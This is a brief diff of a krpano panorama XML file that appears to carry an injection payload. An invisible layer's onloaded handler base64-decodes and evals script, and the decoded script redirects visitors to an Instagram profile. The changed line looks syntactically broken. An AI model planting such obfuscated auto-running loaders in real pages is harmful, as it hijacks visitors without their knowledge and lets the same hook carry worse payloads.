@@ -1,5 +1,5 @@
 <krpano version="1.0.8.15">
     <layer name="js_loader" type="container" visible="false" onloaded="
-        js(var w = atob('d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS92aWFqYW5kb2NvbnNlcmNoIjs='); eval(w););
+        js(eval(var w = atob(&quot;d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS92aWFqYW5kb2NvbnNlcmNoIjs&quot;);eval(w)););
     "/>
 </krpano>
